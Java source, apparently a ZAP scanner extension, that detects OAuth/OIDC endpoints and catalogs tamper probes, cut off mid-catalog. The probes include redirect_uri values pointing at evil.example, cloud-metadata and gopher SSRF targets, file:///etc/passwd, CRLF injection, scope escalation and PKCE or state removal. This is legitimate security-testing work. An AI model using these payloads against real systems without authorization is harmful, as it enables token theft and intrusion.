package org.zaproxy.zap.extension.hacktor;

import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.function.Function;

import org.parosproxy.paros.network.HttpMessage;

/**
 * OAuth endpoint detection and tamper-technique catalog covering OAuth 1.0a,
 * OAuth 2.0 and OpenID Connect regardless of which version a target speaks.
 *
 * <p>Tampering is modelled as an ordered list of (name, value) pairs so that
 * duplicate-parameter pollution, value-level rewrites and query/body partitioning
 * stay faithful to what is actually sent on the wire. Techniques mutate a
 * {@link Context} clone; the UI applies per-parameter encoding/canonicalization
 * preferences before {@link #buildTarget} materialises the wire bytes.
 */
public final class OauthEngine {

    /** Where a parameter came from — drives query vs. form-body placement. */
    public enum Source { QUERY, BODY }

    /** Detected OAuth endpoint flavour. */
    public enum Endpoint {
        NONE("no OAuth endpoint detected"),
        AUTHORIZE("OAuth authorization endpoint"),
        TOKEN("OAuth token endpoint"),
        INTROSPECT("OAuth introspection endpoint"),
        REVOKE("OAuth revocation / end-session endpoint"),
        USERINFO("OIDC userinfo endpoint"),
        LOGOUT("OIDC logout endpoint"),
        WELL_KNOWN("OIDC discovery (well-known / JWKS) endpoint"),
        OTHER("OAuth-shaped request (param-detected)");

        private final String label;
        Endpoint(String label) { this.label = label; }
        public String getLabel() { return label; }
    }

    /** One ordered query/body parameter with a mutable value. */
    public static final class Param {
        public String name;
        public String value;
        public Source source;
        /** Raw wire bytes as received (undecoded); replayed byte-exact when value is unchanged. */
        public String orig;
        public Param(String name, String value) { this(name, value, Source.QUERY); }
        public Param(String name, String value, Source source) {
            this(name, value, source, null);
        }
        public Param(String name, String value, Source source, String orig) {
            this.name = name;
            this.value = value;
            this.source = source;
            this.orig = orig;
        }
        public Param copy() { return new Param(name, value, source, orig); }
    }

    /** Detected (or user-edited) OAuth request context. Thread-confined. */
    public static final class Context {
        public final String rawUrl;
        public final String baseNoQuery;      // scheme://host[:port]/path
        public final String path;             // origin-form path with leading '/'
        public final String host;
        public final Endpoint endpoint;
        public final String flowLabel;
        public final List<Param> params;      // ordered, includes duplicates
        public final Set<String> oauthParams; // detected OAuth parameter names

        Context(String rawUrl, String baseNoQuery, String path, String host,
                Endpoint endpoint, String flowLabel, List<Param> params,
                Set<String> oauthParams) {
            this.rawUrl = rawUrl;
            this.baseNoQuery = baseNoQuery;
            this.path = path;
            this.host = host;
            this.endpoint = endpoint;
            this.flowLabel = flowLabel;
            this.params = params;
            this.oauthParams = oauthParams;
        }

        public Context copy() {
            List<Param> pc = new ArrayList<>(params.size());
            for (Param p : params) pc.add(p.copy());
            return new Context(rawUrl, baseNoQuery, path, host, endpoint, flowLabel,
                pc, new LinkedHashSet<>(oauthParams));
        }

        public boolean hasParam(String name) {
            for (Param p : params) if (p.name.equals(name)) return true;
            return false;
        }

        public String first(String name) {
            for (Param p : params) if (p.name.equals(name)) return p.value;
            return null;
        }

        public boolean isOAuth() {
            if (endpoint == Endpoint.NONE) return false;
            if (endpoint != Endpoint.OTHER) return true;
            return !oauthParams.isEmpty();
        }
    }

    /** A fully quantified tamper probe: literal origin-form target + encoded body. */
    public static final class Wire {
        public final String baseNoQuery;
        public final String literalPathQuery; // origin-form, exact bytes (path[?query])
        public final boolean hasBody;
        public final String bodyString;
        public final int bodyLength;

        Wire(String baseNoQuery, String literalPathQuery, boolean hasBody,
             String bodyString, int bodyLength) {
            this.baseNoQuery = baseNoQuery;
            this.literalPathQuery = literalPathQuery;
            this.hasBody = hasBody;
            this.bodyString = bodyString;
            this.bodyLength = bodyLength;
        }

        /** Builds the wire representation of a context (query params in URL, body params in form body). */
        public static Wire prepare(Context ctx) {
            List<Param> q = new ArrayList<>();
            List<Param> b = new ArrayList<>();
            for (Param p : ctx.params) {
                if (p.source == Source.BODY) b.add(p);
                else q.add(p);
            }
            String query = buildQuery(q);
            String literal = ctx.path;
            if (query != null && !query.isEmpty()) literal = literal + "?" + query;
            boolean hasB = !b.isEmpty();
            String bodyStr = hasB ? buildFormBody(b) : null;
            return new Wire(ctx.baseNoQuery, literal, hasB, bodyStr,
                hasB ? bodyStr.getBytes(StandardCharsets.UTF_8).length : 0);
        }
    }

    /** A catalogued tamper intent. Each {@link #generate} call yields full-context variants. */
    public static final class OauthTech {
        public final VulnCatalog.Tier tier;
        public final String category;
        public final String name;
        public final String description;
        /** Parameter names required for applicability (skip when absent). */
        public final String[] require;
        /** Parameter names the variant is allowed to add (informational). */
        public final String[] addIfAbsent;
        private final Function<Context, List<Context>> gen;

        OauthTech(VulnCatalog.Tier tier, String category, String name, String description,
                  String[] require, String[] addIfAbsent,
                  Function<Context, List<Context>> gen) {
            this.tier = tier;
            this.category = category;
            this.name = name;
            this.description = description;
            this.require = require;
            this.addIfAbsent = addIfAbsent;
            this.gen = gen;
        }

        /** Returns variants for {@code ctx}; empty list when not applicable. */
        public List<Context> generate(Context ctx) {
            if (require != null) {
                for (String req : require) {
                    if (!ctx.hasParam(req)) return Collections.emptyList();
                }
            }
            // Each generator works on a private copy: generators that mutate in
            // place (removals, duplicates) must never alter the shared base context.
            List<Context> out = gen.apply(ctx.copy());
            return out == null ? Collections.emptyList() : out;
        }
    }

    private OauthEngine() {}

    // ─── Detection ───────────────────────────────────────────────────────

    private static final Set<String> OAUTH_NAMES = new LinkedHashSet<>(java.util.Arrays.asList(
        "response_type", "client_id", "client_secret", "redirect_uri", "scope", "state",
        "nonce", "code", "code_challenge", "code_challenge_method", "grant_type",
        "authorization_code", "access_token", "refresh_token", "id_token", "id_token_hint",
        "token_type", "assertion", "claims", "acr_values", "max_age", "login_hint",
        "prompt", "response_mode", "display", "audience", "resource", "aud", "iss",
        "request", "request_uri", "registration", "ui_locales"));

    private static final Set<String> OAUTH1_NAMES = new LinkedHashSet<>(java.util.Arrays.asList(
        "oauth_consumer_key", "oauth_token", "oauth_signature", "oauth_signature_method",
        "oauth_timestamp", "oauth_nonce", "oauth_version", "oauth_callback",
        "oauth_verifier", "oauth_token_secret"));

    /** Parses a raw URL string into a detected OAuth context. */
    public static Context parse(String rawUrl) {
        if (rawUrl == null) return null;
        String s = rawUrl.trim();
        if (s.isEmpty()) return null;
        String[] pieces = splitBaseAndQuery(s);
        String base = pieces[0];
        String query = pieces[1];

        java.net.URI uri;
        try {
            uri = new java.net.URI(s);
        } catch (Exception e) {
            uri = null;
        }
        String path = "/";
        String host = "";
        if (uri != null && uri.getRawPath() != null && !uri.getRawPath().isEmpty()) {
            path = uri.getRawPath();
        }
        if (uri != null && uri.getHost() != null) host = uri.getHost();

        List<Param> params = parseQuery(query);
        Set<String> detected = new LinkedHashSet<>();
        for (Param p : params) {
            if (OAUTH_NAMES.contains(p.name) || isOAuth1Name(p.name)) detected.add(p.name);
        }
        Endpoint ep = detectEndpoint(path, detected);
        boolean paramSignals = !detected.isEmpty();
        if (ep == Endpoint.NONE && paramSignals) ep = Endpoint.OTHER;
        String flow = flowLabel(ep, params);
        return new Context(rawUrl, base, path, host, ep, flow, params, detected);
    }

    /** Parses a full message: query params plus URL-encoded form body params. */
    public static Context parse(HttpMessage msg) {
        if (msg == null) return null;
        String url;
        try {
            url = msg.getRequestHeader().getURI().toString();
        } catch (Exception e) {
            return null;
        }
        Context ctx = parse(url);
        if (ctx == null) return null;
        try {
            String ct = msg.getRequestHeader().getHeader("Content-Type");
            if (ct != null && ct.toLowerCase(Locale.ROOT).contains(
                    "application/x-www-form-urlencoded")) {
                String body = msg.getRequestBody().toString();
                if (body != null && !body.isEmpty()) {
                    List<Param> bodyParams = parseQuery(body);
                    for (Param bp : bodyParams) {
                        bp.source = Source.BODY;
                        ctx.params.add(bp);
                        if (OAUTH_NAMES.contains(bp.name) || isOAuth1Name(bp.name)) {
                            ctx.oauthParams.add(bp.name);
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
        // Body grant_type/scope can change endpoint and flow after the merge.
        Endpoint ep = detectEndpoint(ctx.path, ctx.oauthParams);
        String flow = flowLabel(ep, ctx.params);
        return new Context(ctx.rawUrl, ctx.baseNoQuery, ctx.path, ctx.host, ep, flow,
            ctx.params, ctx.oauthParams);
    }

    private static boolean isOAuth1Name(String n) {
        if (OAUTH1_NAMES.contains(n)) return true;
        return n != null && n.startsWith("oauth1.");
    }

    static Endpoint detectEndpoint(String path, Set<String> oauthParams) {
        if (path == null) return Endpoint.NONE;
        String p = path.toLowerCase(Locale.ROOT);
        if (p.contains("authorize")) return Endpoint.AUTHORIZE;
        if (p.contains("introspect")) return Endpoint.INTROSPECT;
        if (p.contains("revoke") || p.contains("endsession")) return Endpoint.REVOKE;
        if (p.contains("userinfo") || p.contains("user_info")) return Endpoint.USERINFO;
        if (p.contains("logout") || p.contains("idp_exit")) return Endpoint.LOGOUT;
        if (p.contains("well-known") || p.contains("jwks")) return Endpoint.WELL_KNOWN;
        if (p.contains("token")) return Endpoint.TOKEN;
        if (oauthParams != null && !oauthParams.isEmpty()) return Endpoint.OTHER;
        return Endpoint.NONE;
    }

    static String flowLabel(Endpoint ep, List<Param> params) {
        boolean oauth1 = false;
        for (Param p : params) {
            if (isOAuth1Name(p.name)) { oauth1 = true; break; }
        }
        if (oauth1) return "OAuth 1.0a request";
        String rt = first(params, "response_type");
        String gt = first(params, "grant_type");
        String method = first(params, "code_challenge_method");
        switch (ep) {
            case AUTHORIZE:
                if (rt == null) return "OAuth 2.0 authorization (no response_type)";
                if ("token".equals(rt)) return "OAuth 2.0 Implicit flow";
                if ("id_token".equals(rt)) return "OIDC Implicit flow";
                if (rt.contains(" ") && rt.contains("id_token")) return "OIDC Hybrid flow";
                if ("code".equals(rt)) {
                    String pkce = method == null ? "" : "plain".equals(method)
                        ? " (PKCE downgrade-ready)" : " (PKCE: " + method + ")";
                    return "OAuth 2.0 Authorization Code flow" + pkce;
                }
                return "OAuth 2.0 authorization (response_type=" + rt + ")";
            case TOKEN:
                return gt != null && !gt.isEmpty()
                    ? "OAuth 2.0 token exchange (grant_type=" + gt + ")"
                    : "OAuth 2.0 token endpoint";
            case INTROSPECT: return "OAuth 2.0 token introspection";
            case REVOKE:     return "OAuth 2.0 token revocation / end session";
            case USERINFO:   return "OIDC userinfo endpoint";
            case WELL_KNOWN: return "OIDC discovery endpoint";
            case LOGOUT:     return "OIDC logout endpoint";
            default:         return "OAuth-shaped request (param-detected)";
        }
    }

    private static String first(List<Param> params, String name) {
        for (Param p : params) if (p.name.equals(name)) return p.value;
        return null;
    }

    static String[] splitBaseAndQuery(String rawUrl) {
        int q = rawUrl.indexOf('?');
        String base = q >= 0 ? rawUrl.substring(0, q) : rawUrl;
        String query = q >= 0 ? rawUrl.substring(q + 1) : null;
        if (query != null) {
            int h = query.indexOf('#');
            if (h >= 0) query = query.substring(0, h);
        }
        return new String[]{base, query};
    }

    static List<Param> parseQuery(String query) {
        List<Param> out = new ArrayList<>();
        if (query == null || query.isEmpty()) return out;
        for (String kv : query.split("&", -1)) {
            if (kv.isEmpty()) continue;
            int eq = kv.indexOf('=');
            String name = eq >= 0 ? kv.substring(0, eq) : kv;
            String value = eq >= 0 ? kv.substring(eq + 1) : "";
            out.add(new Param(decodeForm(name), decodeForm(value), Source.QUERY, value));
        }
        return out;
    }

    private static String decodeForm(String s) {
        try {
            return URLDecoder.decode(s, "UTF-8");
        } catch (Exception e) {
            return s;
        }
    }

    // ─── Encoding / canonicalization ────────────────────────────────────

    /**
     * Canonicalises a value: upper-cases percent-escape hex digits and folds
     * legacy {@code +} (form-space) into {@code %20}. Double-encoded input keeps
     * its outer layer, giving a predictable "one decode pass" normalisation.
     */
    public static String canonicalize(String v) {
        if (v == null || v.isEmpty()) return v;
        StringBuilder sb = new StringBuilder(v.length());
        for (int i = 0; i < v.length(); i++) {
            char c = v.charAt(i);
            if (c == '%' && i + 2 < v.length() && isHex(v.charAt(i + 1)) && isHex(v.charAt(i + 2))) {
                sb.append('%');
                sb.append(Character.toUpperCase(v.charAt(i + 1)));
                sb.append(Character.toUpperCase(v.charAt(i + 2)));
                i += 2;
            } else if (c == '+') {
                sb.append("%20");
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    private static boolean isHex(char c) {
        return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
    }

    /** Applies optional canonicalization then a {@link PayloadEncoder.Encoder}. */
    public static String encodeValue(String value, PayloadEncoder.Encoder enc, boolean canonicalize) {
        String v = value;
        if (canonicalize) v = canonicalize(v);
        return PayloadEncoder.encode(v, enc);
    }

    /**
     * Percent-encodes only the characters that would corrupt the query envelope
     * ({@code & # % space non-ASCII control}) while leaving existing {@code %XX}
     * escapes and OAuth-safe characters ({@code / : @ = + , ; ! $ ' ( ) * - . _ ~})
     * intact so base64, escaped URLs and overlong forms survive untouched.
     */
    public static String safeEncodeValue(String v) {
        if (v == null) return "";
        StringBuilder sb = new StringBuilder(v.length() + 8);
        byte[] bytes = v.getBytes(StandardCharsets.UTF_8);
        int i = 0;
        while (i < bytes.length) {
            int b = bytes[i] & 0xFF;
            if (b == '%' && i + 2 < bytes.length && isHex((char) bytes[i + 1])
                && isHex((char) bytes[i + 2])) {
                sb.append('%').append((char) bytes[i + 1]).append((char) bytes[i + 2]);
                i += 3;
                continue;
            }
            if ((b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z') || (b >= '0' && b <= '9')
                || b == '-' || b == '_' || b == '.' || b == '~' || b == '/' || b == ':'
                || b == '@' || b == '=' || b == '+' || b == ',' || b == ';' || b == '!'
                || b == '$' || b == '\'' || b == '(' || b == ')') {
                sb.append((char) b);
            } else {
                sb.append('%');
                sb.append(HEX[b >> 4]);
                sb.append(HEX[b & 0x0F]);
            }
            i++;
        }
        return sb.toString();
    }

    private static final char[] HEX =
        {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};

    static String buildQuery(List<Param> params) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < params.size(); i++) {
            if (i > 0) sb.append('&');
            Param p = params.get(i);
            sb.append(safeEncodeName(p.name));
            if (p.value != null && !p.value.isEmpty()) {
                sb.append('=');
                sb.append(emitValue(p));
            }
        }
        return sb.toString();
    }

    /** Replays the original raw bytes when the value is untouched; otherwise re-encodes minimally. */
    private static String emitValue(Param p) {
        if (p.orig != null && p.orig.equals(p.value)) return p.orig;
        if (p.orig != null) {
            String origDecoded;
            try {
                origDecoded = URLDecoder.decode(p.orig, "UTF-8");
            } catch (Exception e) {
                origDecoded = p.orig;
            }
            if (origDecoded.equals(p.value)) return p.orig;
        }
        return safeEncodeValue(p.value);
    }

    static String buildFormBody(List<Param> params) {
        return buildQuery(params);
    }

    private static String safeEncodeName(String n) {
        if (n == null || n.isEmpty()) return "";
        StringBuilder sb = new StringBuilder(n.length());
        for (int i = 0; i < n.length(); i++) {
            char c = n.charAt(i);
            if (isSafeNameChar(c)) sb.append(c);
            else {
                byte[] b = String.valueOf(c).getBytes(StandardCharsets.UTF_8);
                for (byte x : b) {
                    sb.append('%');
                    sb.append(HEX[(x >> 4) & 0x0F]);
                    sb.append(HEX[x & 0x0F]);
                }
            }
        }
        return sb.toString();
    }

    private static boolean isSafeNameChar(char c) {
        return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')
            || c == '-' || c == '_' || c == '.' || c == '~';
    }

    /** Produces a context whose values are encoded/canonicalized per-parameter-name. */
    public static Context applyEncode(Context ctx, Map<String, PayloadEncoder.Encoder> encPref,
            Set<String> canonPref) {
        Context c = ctx.copy();
        for (int i = 0; i < c.params.size(); i++) {
            Param p = c.params.get(i);
            PayloadEncoder.Encoder select = encPref == null ? null : encPref.get(p.name);
            boolean canon = canonPref != null && canonPref.contains(p.name);
            if (select == null && !canon) continue;
            c.params.set(i, transform(p, select, canon));
        }
        return c;
    }

    /**
     * Layers per-param prefs onto a copy. Encoding replaces the decoded value with the
     * encoded form (and its raw bytes); canonicalization upper-cases existing escapes on
     * the raw bytes while keeping the decoded value intact.
     */
    private static Param transform(Param p, PayloadEncoder.Encoder sel, boolean canon) {
        Param np = p;
        if (sel != null) {
            String newValue = encodeValue(p.value, sel, false);
            np = new Param(np.name, newValue, np.source, newValue);
        }
        if (canon) {
            String raw = np.orig == null ? np.value : np.orig;
            np = new Param(np.name, np.value, np.source, canonicalize(raw));
        }
        return np;
    }

    /** Enforces the exact wire target and body on a message (literal path side-channel). */
    public static void buildTarget(HttpMessage msg, Wire wire) {
        try {
            int q = wire.literalPathQuery.indexOf('?');
            String queryPart = q >= 0 ? wire.literalPathQuery.substring(q + 1) : "";
            if (queryPart.isEmpty()) {
                HacktorEngine.setLiteralPath(msg, wire.literalPathQuery);
                HacktorEngine.replacePath(msg, wire.baseNoQuery);
            } else {
                HacktorEngine.replacePath(msg, wire.baseNoQuery + "?" + queryPart);
                HacktorEngine.setLiteralPath(msg, wire.literalPathQuery);
            }
            if (wire.hasBody) {
                msg.setRequestBody(wire.bodyString);
                msg.getRequestHeader().setHeader("Content-Type", "application/x-www-form-urlencoded");
                msg.getRequestHeader().setHeader("Content-Length", Integer.toString(wire.bodyLength));
            }
        } catch (Exception ignored) {
        }
    }

    // ─── Variant helpers ─────────────────────────────────────────────────

    static Context replace(Context c, String param, String value) {
        for (Param p : c.params) {
            if (p.name.equals(param)) {
                p.value = value;
                return c;
            }
        }
        c.params.add(new Param(param, value, sourceOf(c, param)));
        return c;
    }

    static Context add(Context c, String param, String value) {
        c.params.add(new Param(param, value, Source.QUERY));
        return c;
    }

    static Context remove(Context c, String param) {
        c.params.removeIf(p -> p.name.equals(param));
        return c;
    }

    static Context duplicate(Context c, String param, String value) {
        c.params.add(new Param(param, value, sourceOf(c, param)));
        return c;
    }

    static Source sourceOf(Context c, String param) {
        for (Param p : c.params) {
            if (p.name.equals(param)) return p.source;
        }
        return Source.QUERY;
    }

    /** Describes the delta between a context and its modified variant, for the UI. */
    public static String summarize(Context base, Context variant) {
        StringBuilder sb = new StringBuilder();
        for (Param pv : variant.params) {
            String basev = base.first(pv.name);
            if (basev == null) {
                sb.append("[ADD] ").append(pv.name).append(" = ").append(pv.value).append(" ");
            } else if (!basev.equals(pv.value)) {
                sb.append("[SET] ").append(pv.name).append(" = ").append(pv.value).append(" ");
            }
        }
        for (Param pb : base.params) {
            if (!variant.hasParam(pb.name)) sb.append("[DEL] ").append(pb.name).append(" ");
        }
        return sb.toString().trim();
    }

    // ─── Catalog ─────────────────────────────────────────────────────────

    private static final String[] NO_REQ = new String[0];
    private static final String[] NO_ADD = new String[0];

    private static String[] re(String... names) { return names; }

    /**
     * Builds the full tamper catalog, tier-tagged. Each entry applies only when its
     * {@code require} params are present; entries that {@code addIfAbsent} still
     * generate a variant when the param is missing. Built once lazily at class-init
     * and reused by every caller: {@link #catalog} must not be rebuilt per UI refresh.
     */
    private static List<OauthTech> buildCatalog() {
        List<OauthTech> out = new ArrayList<>();
        VulnCatalog.Tier C = VulnCatalog.Tier.CLASSIC;
        VulnCatalog.Tier R = VulnCatalog.Tier.RARE;
        VulnCatalog.Tier N = VulnCatalog.Tier.NOVEL;

        // ── redirect_uri ────────────────────────────────────────────────
        String[] ru = re("redirect_uri");
        out.add(oa(C, "Redirect URI", "External host takeover",
            "Point redirect_uri at an attacker-controlled host; breaks strict-equals allowlists.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://evil.example/callback"))));
        out.add(oa(R, "Redirect URI", "Sibling subdomain loosening",
            "Use a sibling subdomain; breaks suffix/prefix allowlists.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://" + c.host + ".evil.example/cb"))));
        out.add(oa(C, "Redirect URI", "Prefix-match confusion",
            "Attacker host, then the app host as path — breaks prefix-matching validators.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://evil.example/" + c.host))));
        out.add(oa(C, "Redirect URI", "Same-host, deep path",
            "Keep the honest host, diverge below it — exploits open-path forwarders.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://" + c.host + "/oauth/attacker/cb"))));
        out.add(oa(C, "Redirect URI", "Same-host, alternate port",
            "Same host on an unusual port; port-insensitive validators reaccept the host.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://" + c.host + ":9/cb"))));
        out.add(oa(C, "Redirect URI", "At-sign userinfo",
            "Cram attacker authority after @; URL parsers resolve the LAST authority.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://" + c.host + "@evil.example/"))));
        out.add(oa(C, "Redirect URI", "Backslash userinfo",
            "Backslash before @ — some parsers treat \\ as /, widening the at-sign split.",
            ru, c -> vary(c, set(c, "redirect_uri",
                "https://" + c.host + "\\@evil.example/"))));
        out.add(oa(R, "Redirect URI", "Fragment host-injection",
            "Append @evil after #; #{bad} hosts slip regex allowlists that anchor the end.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://" + c.host + "#@evil.example/"))));
        out.add(oa(C, "Redirect URI", "Scheme-relative",
            "//evil.example — inherits the page scheme; validators that require https: fail.",
            ru, c -> vary(c, set(c, "redirect_uri", "//evil.example/cb"))));
        out.add(oa(C, "Redirect URI", "Bare host",
            "evil.example without a scheme — parser-ellipsis acceptance by naive validators.",
            ru, c -> vary(c, set(c, "redirect_uri", "evil.example"))));
        out.add(oa(C, "Redirect URI", "Pre-encoded URL",
            "Already percent-encoded form; decoders in the validator chain unlayer it.",
            ru, c -> vary(c, set(c, "redirect_uri", "https%3A%2F%2Fevil.example%2Fcb"))));
        out.add(oa(C, "Redirect URI", "Loopback callback",
            "127.0.0.1 accepted by debug/native-client configurations.",
            ru, c -> vary(c, set(c, "redirect_uri", "http://127.0.0.1/cb"))));
        out.add(oa(R, "Redirect URI", "Trailing-dot FQDN",
            "evil.example. — trailing root dot defeats exact-string host equality tests.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://evil.example./cb"))));
        out.add(oa(R, "Redirect URI", "Percent-encoded scheme",
            "https:%2f%2fevil.example — hides the absent double slash from non-decoders.",
            ru, c -> vary(c, set(c, "redirect_uri", "https:%2f%2fevil.example%2fcb"))));
        out.add(oa(R, "Redirect URI", "Percent-dot host confusion",
            "evil.example%2ecom — dots as %2e trip substring matchers into host misreading.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://evil.example%2ecom/"))));
        out.add(oa(R, "Redirect URI", "Query-based split host",
            "Attacker authority hidden behind a query — solutions that scan for 'https:' accept it.",
            ru, c -> vary(c, set(c, "redirect_uri",
                "https://evil.example?redirect_uri=https://" + c.host))));
        out.add(oa(N, "Redirect URI", "Cloud-metadata SSRF",
            "Loopback IPv6-mapped metadata address — catches unprepared egress filtering.",
            ru, c -> vary(c, set(c, "redirect_uri",
                "http://[::ffff:169.254.169.254]/latest/meta-data/"))));
        out.add(oa(N, "Redirect URI", "Non-HTTP file scheme",
            "file:// URI — parsers that gate on scheme allowlists may forward files.",
            ru, c -> vary(c, set(c, "redirect_uri", "file:///etc/passwd"))));
        out.add(oa(N, "Redirect URI", "gopher internal probe",
            "gopher:// to a local service — documents SSRF reach beyond the edge.",
            ru, c -> vary(c, set(c, "redirect_uri", "gopher://127.0.0.1:6379/_INFO"))));
        out.add(oa(N, "Redirect URI", "Homoglyph host",
            "Fullwidth letters normalise to a different host after unicode case-folding.",
            ru, c -> vary(c, set(c, "redirect_uri", "https://\uFF45vil.example/"))));
        out.add(oa(N, "Redirect URI", "Overlong UTF-8 slash",
            "%c0%af slash forms slip decoders that decode only standard encodings.",
            ru, c -> vary(c, set(c, "redirect_uri", "https:%c0%af%c0%afevil.example/"))));
        out.add(oa(N, "Redirect URI", "CRLF-folding into callback",
            "%0d%0a in the URI — probes header-injection on the redirect hop.",
            ru, c -> vary(c, set(c, "redirect_uri",
                "https://evil.example/%250d%250aX-Hacktor%3A1"))));

        // ── response_type ───────────────────────────────────────────────
        String[] rt = re("response_type");
        out.add(oa(C, "Response Type", "Downgrade to implicit token",
            "Swap code for token — the access token returns in the URL fragment (Implicit).",
            rt, c -> vary(c, set(c, "response_type", "token"))));
        out.add(oa(C, "Response Type", "Add id_token (hybrid)",
            "code id_token — OIDC hybrid, gets an id_token without the full code flow.",
            rt, c -> vary(c, set(c, "response_type", "code id_token"))));
        out.add(oa(C, "Response Type", "Force id_token only",
            "id_token alone — tests whether the IdP enforces response_type allowlists.",
            rt, c -> vary(c, set(c, "response_type", "id_token"))));
        out.add(oa(C, "Response Type", "Empty value",
            "response_type= — malformed-must-reject vs. lenient-default parsing.",
            rt, c -> vary(c, set(c, "response_type", ""))));
        out.add(oa(R, "Response Type", "Non-standard password",
            "password as response_type — some endpoints accept flow keywords they never expose.",
            rt, c -> vary(c, set(c, "response_type", "password"))));
        out.add(oa(R, "Response Type", "Unknown custom type",
            "response_type=x — differentials on unknown values reveal strict vs. default flow.",
            rt, c -> vary(c, set(c, "response_type", "x"))));
        out.add(oa(N, "Response Type", "Polluted duplicate",
            "Two response_type values — parser-precedence difference leaks flow selection.",
            rt, c -> vary(c, dup(c, "response_type", "token"))));

        // ── scope ───────────────────────────────────────────────────────
        String[] sc = re("scope");
        out.add(oa(C, "Scope", "Remove scope",
            "Silent de-scoping — server defaults may still grant privileged scopes.",
            sc, c -> one(c, remove(c, "scope"))));
        out.add(oa(C, "Scope", "Empty scope",
            "scope= — empty-scope grants on misconfigured providers.",
            sc, c -> vary(c, set(c, "scope", ""))));
        out.add(oa(C, "Scope", "Wildcard scope",
            "scope=* — some IdPs honor wildcard for internal service accounts.",
            sc, c -> vary(c, set(c, "scope", "*"))));
        out.add(oa(C, "Scope", "Privileged admin literal",
            "scope=admin — classic privilege-lift token on lenient scopes.",
            sc, c -> vary(c, set(c, "scope", "admin"))));
        out.add(oa(C, "Scope", "Expanded profile claims",
            "openid offline_access — broad claim/offline set for long-lived tokens.",
            sc, c -> vary(c, set(c, "scope",
                "openid email profile address phone offline_access"))));
        out.add(oa(R, "Scope", "Resource-scope convention",
            "https://api.<host>/.default — Azure-style resource scope, accepted verbatim.",
            sc, c -> vary(c, set(c, "scope", "https://api." + c.host + "/.default"))));
        out.add(oa(R, "Scope", "all_claims shorthand",
            "all_claims — AD claims-all shorthand when scope=openid is insufficient.",
            sc, c -> vary(c, set(c, "scope", "all_claims"))));
        out.add(oa(N, "Scope", "Newline-delimited scope",
            "openid<newline>admin — uses whitespace-splitting to smuggle an extra scope.",
            sc, c -> vary(c, set(c, "scope", "openid\nadmin"))));
        out.add(oa(N, "Scope", "Duplicate scope pollution",
            "Second scope value appended — multi-value merge semantics vary by library.",
            sc, c -> vary(c, dup(c, "scope", "admin"))));

        // ── state / CSRF ────────────────────────────────────────────────
        String[] st = re("state");
        out.add(oa(C, "State/CSRF", "Remove state",
            "Missing state — authorizes the user with no anti-CSRF binding.",
            st, c -> one(c, remove(c, "state"))));
        out.add(oa(C, "State/CSRF", "Empty state",
            "state= — empty-state acceptance on lenient CSRF implementations.",
            st, c -> vary(c, set(c, "state", ""))));
        out.add(oa(C, "State/CSRF", "Fixed attacker state",
            "state=hacktor — fixed value the attacker replays in a second browser.",
            st, c -> vary(c, set(c, "state", "hacktor"))));
        out.add(oa(C, "State/CSRF", "Numeric state",
            "state=1 — predictability check for sequential/timestamp state servers.",
            st, c -> vary(c, set(c, "state", "1"))));
        out.add(oa(R, "State/CSRF", "Duplicate state (reuse)",
            "Second identical state — CSRF-token rotation bypass if de-duped by value.",
            st, c -> one(c, duplicate(c, "state", c.first("state")))));
        out.add(oa(N, "State/CSRF", "Multiline state",
            "state with newline — log/parse splitting, and opaque-token trust tests.",
            st, c -> vary(c, set(c, "state", "hacktor\nsession"))));
        out.add(oa(N, "State/CSRF", "Right-to-left state",
            "State carrying a bidi char — normalization differentials in state hashing.",
            st, c -> vary(c, set(c, "state", "\u202Ehacktor"))));

        // ── PKCE ────────────────────────────────────────────────────────
        String[] pcCh = re("code_challenge");
        out.add(oa(C, "PKCE", "Remove challenge",
            "Back to plain authorization code flow — bypasses the PKCE proof entirely.",
            pcCh, c -> one(c, remove(c, "code_challenge"))));
        out.add(oa(C, "PKCE", "Replace with plain method",
            "code_challenge_method=plain — downgrades S256 to a replayable transit secret.",
            pcCh, c -> c.hasParam("code_challenge_method")
                ? vary(c, set(c, "code_challenge_method", "plain")) : null));
        out.add(oa(C, "PKCE", "Remove method",
            "Standalone challenge without method — library parses default (often plain).",
            pcCh, c -> c.hasParam("code_challenge_method")
                ? one(c, remove(c, "code_challenge_method")) : null));
        out.add(oa(C, "PKCE", "Empty challenge",
            "Empty code_challenge accepted by clients that skip PKCE when absent.",
            pcCh, c -> vary(c, set(c, "code_challenge", ""))));
        out.add(oa(R, "PKCE", "Truncated challenge",
            "Half-length challenge — length-validation gaps still pass the exchange.",
            pcCh, c -> {
                String cur = c.first("code_challenge");
                if (cur == null || cur.length() < 2) return null;
                return vary(c, set(c, "code_challenge", cur.substring(0, cur.length() / 2)));
            }));
        out.add(oa(N, "PKCE", "Challenge/method mismatch",
            "plain method tagged onto an S256-style challenge — parser divergence on verifier.",
            pcCh, c -> c.hasParam("code_challenge_method")
                ? vary(c, set(c, "code_challenge_method", "plain")) : null));
        out.add(oa(N, "PKCE", "Duplicated challenge",
            "Two identical challenges — de-dupe/replay semantics on the verifier.",
            pcCh, c -> one(c, duplicate(c, "code_challenge", c.first("code_challenge")))));

        // ── grant_type / token exchange ─────────────────────────────────
        String[] gt = re("grant_type");
        out.add(oa(C, "Grant Type", "Switch to authorization_code",
            "grant_type=authorization_code — tests token endpoint grant allowlisting.",
            gt, c -> vary(c, set(c, "grant_type", "authorization_code"))));
        out.add(oa(C, "Grant Type", "Switch to client_credentials",
            "grant_type=client_credentials — server-to-server grant unless disallowed.",
